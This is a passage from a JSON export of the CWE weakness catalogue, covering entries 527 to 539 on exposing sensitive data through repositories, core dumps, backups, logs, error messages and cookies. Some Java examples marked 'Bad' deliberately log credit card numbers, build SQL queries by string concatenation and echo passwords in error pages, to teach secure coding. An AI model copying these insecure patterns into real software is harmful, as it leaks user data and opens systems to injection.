        {
          "Reference": "CVE-2022-27195",
          "Description": "Plugin for an automation server inserts environment variable contents into build XML files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-27195"
        },
        {
          "Reference": "CVE-2022-25264",
          "Description": "CI/CD tool logs environment variables related to passwords add Contribution to content history.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-25264"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1318",
          "Authors": [
            "David Fiser, Alfredo Oliveira"
          ],
          "Title": "Analyzing the Hidden Danger of Environment Variables for Keeping Secrets",
          "PublicationYear": "2022",
          "PublicationMonth": "08",
          "PublicationDay": "17",
          "URL": "https://www.trendmicro.com/en_us/research/22/h/analyzing-hidden-danger-of-environment-variables-for-keeping-secrets.html",
          "URLDate": "2023-01-26"
        },
        {
          "ExternalReferenceID": "REF-1319",
          "Authors": [
            "Nicolas Harraudeau"
          ],
          "Title": "Using environment variables is security-sensitive",
          "PublicationYear": "2021",
          "PublicationMonth": "04",
          "PublicationDay": "28",
          "URL": "https://sonarsource.atlassian.net/browse/RSPEC-5304",
          "URLDate": "2023-01-26"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "527",
      "Name": "Exposure of Version-Control Repository to an Unauthorized Control Sphere",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product stores a CVS, git, or other repository in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.",
      "ExtendedDescription": "Version control repositories such as CVS or git store version-specific metadata and other details within subdirectories. If these subdirectories are stored on a web server or added to an archive, then these could be used by an attacker. This information may include usernames, filenames, path root, IP addresses, and detailed \"diff\" data about how files have been changed - which could reveal source code snippets that were never intended to be made public.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "552",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Operation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation",
            "Distribution",
            "System Configuration"
          ],
          "Description": "Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "528",
      "Name": "Exposure of Core Dump File to an Unauthorized Control Sphere",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product generates a core dump file in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "552",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Operation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "System Configuration"
          ],
          "Description": "Protect the core dump files from unauthorized access."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM06-C",
          "EntryName": "Ensure that sensitive data is not written out to disk"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "529",
      "Name": "Exposure of Access Control List Files to an Unauthorized Control Sphere",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.",
      "ExtendedDescription": "Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "552",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Operation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Access Control"
          ],
          "Impact": [
            "Read Application Data",
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "System Configuration"
          ],
          "Description": "Protect access control list files."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "530",
      "Name": "Exposure of Backup File to an Unauthorized Control Sphere",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A backup file is stored in a directory or archive that is made accessible to unauthorized actors.",
      "ExtendedDescription": "Often, older backup files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "552",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Operation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "At a minimum, an attacker who retrieves this file would have all the information contained in it, whether that be database calls, the format of parameters accepted by the application, or simply information regarding the architectural structure of your site."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Policy"
          ],
          "Description": "Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "531",
      "Name": "Inclusion of Sensitive Information in Test Code",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "540",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Testing"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Distribution",
            "Installation"
          ],
          "Description": "Remove test code before deploying the application into production."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Examples of common issues with test applications include administrative functions, listings of usernames, passwords or session identifiers and information about the system, server or application configuration."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "532",
      "Name": "Insertion of Sensitive Information into Log File",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.",
      "ExtendedDescription": "\n\nWhile logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.\n\n\nDifferent log files may be produced and stored for:\n\n\n  - Server log files (e.g. server.log). This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.\n\n  - log files that are used for debugging\n\n",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "538",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "200",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Logging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files."
        },
        {
          "Phase": [
            "Distribution"
          ],
          "Description": "Remove debug log files before deploying the application into production."
        },
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Protect log files against unauthorized read/write."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Adjust configurations appropriately when software is transitioned from a debug state to production."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-179",
          "Entries": [
            {
              "IntroText": "In the following code snippet, a user's full name and credit card number are written to a log file."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tlogger.info(\"Username: \" + usernme + \", CCN: \" + ccn);\n```"
            }
          ]
        },
        {
          "ID": "DX-120",
          "Entries": [
            {
              "IntroText": "This code stores location information about the current user:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tlocationClient = new LocationClient(this, this, this);\n\tlocationClient.connect();\n\tcurrentUser.setLocation(locationClient.getLastLocation());\n```\n...* \n\t\n\tcatch (Exception e) {\n\t```\n\t\tAlertDialog.Builder builder = new AlertDialog.Builder(this);\n\t\tbuilder.setMessage(\"Sorry, this application has experienced an error.\");\n\t\tAlertDialog alert = builder.create();\n\t\talert.show();\n\t\tLog.e(\"ExampleActivity\", \"Caught exception: \" + e + \" While on User:\" + User.toString());\n\t}\n```"
            },
            {
              "BodyText": "When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log."
            }
          ]
        },
        {
          "ID": "DX-119",
          "Entries": [
            {
              "IntroText": "In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic BankAccount getUserBankAccount(String username, String accountNumber) {\n\t\t\tBankAccount userAccount = null;\n\t\t\tString query = null;\n\t\t\ttry {\n\t\t\t\tif (isAuthorizedUser(username)) {\n\t\t\t\t\tquery = \"SELECT * FROM accounts WHERE owner = \"\n\t\t\t\t\t+ username + \" AND accountID = \" + accountNumber;\n\t\t\t\t\tDatabaseManager dbManager = new DatabaseManager();\n\t\t\t\t\tConnection conn = dbManager.getConnection();\n\t\t\t\t\tStatement stmt = conn.createStatement();\n\t\t\t\t\tResultSet queryResult = stmt.executeQuery(query);\n\t\t\t\t\tuserAccount = (BankAccount)queryResult.getObject(accountNumber);\n\t\t\t\t}\n\t\t\t} catch (SQLException ex) {\n\t\t\t\tString logMessage = \"Unable to retrieve account information from database,\\nquery: \" + query;\n\t\t\t\tLogger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);\n\t\t\t}\n\t\t\treturn userAccount;\n\t}\n```"
            },
            {
              "BodyText": "The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2017-9615",
          "Description": "verbose logging stores admin credentials in a world-readable log file",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-9615"
        },
        {
          "Reference": "CVE-2018-1999036",
          "Description": "SSH password for private key stored in build log",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1999036"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "FIO13-J",
          "EntryName": "Do not log sensitive information outside a trust boundary"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "RelatedAttackPatterns": [
        "215"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "533",
      "Name": "DEPRECATED: Information Exposure Through Server Log Files",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This entry has been deprecated because its abstraction was too low-level.  See CWE-532.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "534",
      "Name": "DEPRECATED: Information Exposure Through Debug Log Files",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This entry has been deprecated because its abstraction was too low-level.  See CWE-532.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "535",
      "Name": "Exposure of Information Through Shell Error Message",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "211",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "536",
      "Name": "Servlet Runtime Error Message Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "211",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The error message may contain the location of the file in which the offending function is located. This may disclose the web root's absolute path as well as give the attacker the location of application files or configuration information. It may even disclose the portion of code that failed. In many cases, an attacker can use the data to launch further attacks against the system."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-190",
          "Entries": [
            {
              "IntroText": "The following servlet code does not catch runtime exceptions, meaning that if such an exception were to occur, the container may display potentially dangerous information (such as a full stack trace)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\tString username = request.getParameter(\"username\");\n```\n// May cause unchecked NullPointerException.* \n\t\t\tif (username.length() < 10) {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "537",
      "Name": "Java Runtime Error Message Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "211",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not expose sensitive error information to the user."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-191",
          "Entries": [
            {
              "IntroText": "In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class InputFileRead {\n\t\t\tprivate File readFile = null;\n\t\t\tprivate FileReader reader = null;\n\t\t\tprivate String inputFilePath = null;\n\t\t\tprivate final String DEFAULT_FILE_PATH = \"c:\\\\somedirectory\\\\\";\n\t\t\tpublic InputFileRead() {\n\t\t\t\tinputFilePath = DEFAULT_FILE_PATH;\n\t\t\t}\n\t\t\tpublic void setInputFile(String inputFile) {\n```\n/* Assume appropriate validation / encoding is used and privileges / permissions are preserved */* \n\t\t\t\t\t}\n\t\t\t\n\t\t\tpublic void readInputFile() {\n\t\t\t```\n\t\t\t\t\ttry {\n\t\t\t\t\t\treader = new FileReader(readFile);\n\t\t\t\t\t\t...\n\t\t\t\t\t} catch (RuntimeException rex) {\n\t\t\t\t\t\tSystem.err.println(\"Error: Cannot open input file in the directory \" + inputFilePath);\n\t\t\t\t\t\tSystem.err.println(\"Input file has not been set, call setInputFile method before calling readInputFile\");\n\t\t\t\t\t} catch (FileNotFoundException ex) {...}\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the example below, the BankManagerLoginServlet servlet class will process a login request to determine if a user is authorized to use the BankManager Web service. The doPost method will retrieve the username and password from the servlet request and will determine if the user is authorized. If the user is authorized the servlet will go to the successful login page. Otherwise, the servlet will raise a FailedLoginException and output the failed login message to the error page of the service."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankManagerLoginServlet extends HttpServlet {\n\t\t\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\t\t\ttry {\n```\n// Get username and password from login page request* \n\t\t\t\t\t\t\tString username = request.getParameter(\"username\");\n\t\t\t\t\t\t\tString password = request.getParameter(\"password\");\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t *// Authenticate user* \n\t\t\t\t\t\t\tBankManager bankMgr = new BankManager();\n\t\t\t\t\t\t\tboolean isAuthentic = bankMgr.authenticateUser(username, password);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t *// If user is authenticated then go to successful login page* \n\t\t\t\t\t\t\tif (isAuthentic) {\n\t\t\t\t\t\t\t```\n\t\t\t\t\t\t\t\trequest.setAttribute(\"login\", new String(\"Login Successful.\"));\n\t\t\t\t\t\t\t\tgetServletContext().getRequestDispatcher(\"/BankManagerServiceLoggedIn.jsp\"). forward(request, response);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n```\n// Otherwise, raise failed login exception and output unsuccessful login message to error page* \n\t\t\t\t\t\t\t\t\tthrow new FailedLoginException(\"Failed Login for user \" + username + \" with password \" + password);}} catch (FailedLoginException ex) {\n\t\t\t\t\t```\n```\n// output failed login message to error page* \n\t\t\t\t\t\t\trequest.setAttribute(\"error\", new String(\"Login Error\"));\n\t\t\t\t\t\t\trequest.setAttribute(\"message\", ex.getMessage());\n\t\t\t\t\t\t\tgetServletContext().getRequestDispatcher(\"/ErrorPage.jsp\").forward(request, response);}}"
            },
            {
              "BodyText": "However, the output message generated by the FailedLoginException includes the user-supplied password. Even if the password is erroneous, it is probably close to the correct password. Since it is printed to the user's page, anybody who can see the screen display will be able to see the password. Also, if the page is cached, the password might be written to disk."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "538",
      "Name": "Insertion of Sensitive Information into Externally-Accessible File or Directory",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "200",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Operation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Files or Directories"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Operation",
            "System Configuration"
          ],
          "Description": "Do not expose file and directory information to the user."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-179",
          "Entries": [
            {
              "IntroText": "In the following code snippet, a user's full name and credit card number are written to a log file."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tlogger.info(\"Username: \" + usernme + \", CCN: \" + ccn);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2018-1999036",
          "Description": "SSH password for private key stored in build log",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1999036"
        }
      ],
      "RelatedAttackPatterns": [
        "95"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 12: Information Leakage.\" Page 191",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness."
        },
        {
          "Type": "Maintenance",
          "Note": "There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category."
        }
      ]
    },
    {
      "ID": "539",
      "Name": "Use of Persistent Cookies Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The web application uses persistent cookies, but the cookies contain sensitive information.",
      "ExtendedDescription": "Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory and are not stored anywhere, but persistent cookies are stored on the browser's hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "552",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
